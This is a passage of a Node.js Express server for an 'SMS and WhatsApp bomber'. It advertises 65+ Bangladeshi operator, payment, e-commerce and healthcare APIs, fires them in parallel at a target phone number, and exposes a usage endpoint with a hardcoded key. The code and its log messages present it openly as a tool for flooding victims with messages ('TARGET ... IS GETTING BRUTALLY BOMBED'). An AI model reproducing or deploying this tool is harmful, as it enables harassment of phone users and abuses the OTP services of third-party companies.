        successful: successful,
        failed: ALL_APIS.length - successful,
        success_rate: `${successRate}%`,
        execution_time_ms: execTime,
        execution_time_sec: (execTime / 1000).toFixed(3),
        speed: `${(ALL_APIS.length / (execTime / 1000)).toFixed(0)} APIs/sec`,
        intensity: intensity,
        key_used: key,
        breakdown: {
            whatsapp: whatsappSuccess,
            btcl: btclSuccess,
            grameenphone: gpSuccess,
            robi_airtel: robiSuccess,
            ecommerce: ecommerceSuccess,
            healthcare: healthcareSuccess,
            entertainment: entertainmentSuccess,
            gaming: gamingSuccess,
            finance: financeSuccess,
            food_delivery: foodSuccess
        },
        timestamp: new Date().toISOString(),
        message: `🔥 BANGLADESH TARGET +88${num} IS GETTING BRUTALLY BOMBED WITH ${ALL_APIS.length} APIS! ${skulls} 🔥`
    });
});

app.get('/', (req, res) => {
    res.json({
        status: "💀💀💀 ULTIMATE BANGLADESH BRUTAL BOMBER API 💀💀💀",
        version: "4.0 - MAX POWER",
        total_apis: ALL_APIS.length,
        api_breakdown: {
            whatsapp: ALL_APIS.filter(a => a.type === 'whatsapp').length,
            btcl: 5,
            grameenphone: 7,
            robi_airtel: 4,
            ecommerce: 8,
            healthcare: 10,
            entertainment: 5,
            gaming: 6,
            finance: 4,
            ride_sharing: 3,
            travel: 3,
            food: 4,
            marketplace: 4,
            fashion: 2,
            education: 3
        },
        timeout: "1.5 SECONDS (BRUTAL!)",
        execution: "ALL APIs PARALLEL",
        default_key: "shuvo",
        usage: "/bom?key=shuvo&num=9876543210",
        features: [
            "🔥 65+ Working APIs (SMS + WhatsApp)",
            "💬 10+ WhatsApp APIs",
            "🇧🇩 All Bangladesh Operators (BTCL, GP, Robi, Airtel, Teletalk)",
            "🛍️ Major E-commerce Platforms",
            "🏥 Healthcare & Medicine Delivery",
            "🎮 Gaming & Betting Platforms",
            "🍔 Food Delivery Services",
            "💰 Mobile Financial Services (Nagad, bKash, Rocket)",
            "🎬 OTT & Entertainment Platforms",
            "📚 E-learning Platforms",
            "🚕 Ride Sharing Services"
        ],
        timestamp: new Date().toISOString()
    });
});

app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: "healthy", 
        apis: ALL_APIS.length,
        whatsapp_apis: ALL_APIS.filter(a => a.type === 'whatsapp').length,
        uptime: process.uptime()
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n💀💀💀 ULTIMATE BANGLADESH BRUTAL BOMBER DEPLOYED 💀💀💀`);
    console.log(`🔑 YOUR API KEY: shuvo`);
    console.log(`📡 TOTAL APIS: ${ALL_APIS.length}`);
    console.log(`   💬 WhatsApp: ${ALL_APIS.filter(a => a.type === 'whatsapp').length}`);
    console.log(`   📞 BTCL: 5 | GP: 7 | Robi/Airtel: 4`);
    console.log(`   🛍️ E-commerce: 8 | 🏥 Healthcare: 10`);
    console.log(`   🎮 Gaming: 6 | 🍔 Food: 4 | 💰 Finance: 4`);
    console.log(`⚡ TIMEOUT: 1.5 SECONDS`);
    console.log(`🚀 BRUTAL POWER: MAXIMUM LEVEL`);
    console.log(`🌐 PORT: ${PORT}`);
});